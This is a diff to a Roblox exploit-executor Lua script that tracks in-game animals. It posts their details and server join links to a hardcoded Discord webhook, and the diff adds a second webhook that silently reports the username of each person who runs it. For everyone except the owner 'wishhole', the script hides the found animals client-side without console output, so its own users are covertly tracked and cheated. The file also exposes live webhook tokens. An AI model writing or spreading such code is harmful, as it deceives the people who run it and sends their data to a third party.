@@ -1,5 +1,7 @@
 -- 🔗 Webhook Animal Tracker with Client-Side Hide for Non-Owner (No Console Prints)
-local WEBHOOK = "https://discord.com/api/webhooks/1432020181441581229/vYYXG0DP-OBFZRgxxWtuY_kHuXOnTWVO_k9DsvsiZYNkAs4UlvGQ2opHfQPtg_OS_pAU"
+local WEBHOOK1 = "https://discord.com/api/webhooks/1432020181441581229/vYYXG0DP-OBFZRgxxWtuY_kHuXOnTWVO_k9DsvsiZYNkAs4UlvGQ2opHfQPtg_OS_pAU"
+local WEBHOOK2 = "https://discord.com/api/webhooks/1432390622312009750/g2IoaQ41zf_cho5ySXJGRgAOc3ohc6rYEDiNhHr3rJZKadfjloo-j2oXWQMF2L1ofm4a"
+
 local folder = workspace:WaitForChild("Map"):WaitForChild("Animals")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -8,7 +10,6 @@ local player = Players.LocalPlayer
 
 -- 🖼️ Animal images / tracked models
 local animalImages = {
-	["Chicken"] = "https://drive.google.com/uc?export=view&id=1jkot99uQbfCcHoaLpJA-YTlskSq_JM2v",
 	["Dragon"] = "https://drive.google.com/uc?export=view&id=1jkot99uQbfCcHoaLpJA-YTlskSq_JM2v",
 	["Golden Dragon"] = "https://drive.google.com/uc?export=view&id=1bLDSMOgviKIPN5OKo3ngpX17HpzBoEkO",
 	["Griffin"] = "https://drive.google.com/uc?export=view&id=1VRZTQ1xdH_vRbo1TSTLGtZ7wm1yMI5jS",
@@ -26,9 +27,32 @@ end
 -- 🆔 Game info
 local placeId = 96114180925459
 local serverId = game.JobId
+local username = player.Name
 
--- 🌐 Webhook sender
-local function sendWebhook(name, weight, imageUrl)
+-- 🌐 Send username to second webhook
+local function sendUsername()
+	local payload = HttpService:JSONEncode({
+		content = string.format("👤 **Script Activated By:** `%s`", username)
+	})
+
+	local requestData = {
+		Url = WEBHOOK2,
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = payload
+	}
+
+	if syn and syn.request then
+		syn.request(requestData)
+	elseif http_request then
+		http_request(requestData)
+	elseif request then
+		request(requestData)
+	end
+end
+
+-- 🌐 Send animal info to main webhook
+local function sendAnimalWebhook(name, weight, imageUrl)
 	local joinLink = string.format("roblox://placeId=%s&gameInstanceId=%s", placeId, serverId)
 
 	local embed = {
@@ -47,7 +71,7 @@ local function sendWebhook(name, weight, imageUrl)
 	local payload = HttpService:JSONEncode({ embeds = { embed } })
 
 	local requestData = {
-		Url = WEBHOOK,
+		Url = WEBHOOK1,
 		Method = "POST",
 		Headers = { ["Content-Type"] = "application/json" },
 		Body = payload
@@ -78,7 +102,7 @@ local function handleModel(model)
 	end
 
 	local imageUrl = animalImages[name]
-	sendWebhook(name, weightValue, imageUrl)
+	sendAnimalWebhook(name, weightValue, imageUrl)
 
 	-- 🧹 Client-only deletion for non-owner players
 	if player.Name ~= "wishhole" then
@@ -89,6 +113,9 @@ local function handleModel(model)
 		end)
 	end
 end
+
+-- 📨 Send username once when script runs
+sendUsername()
 
 -- 🔍 Initial scan
 for _, animal in ipairs(folder:GetChildren()) do
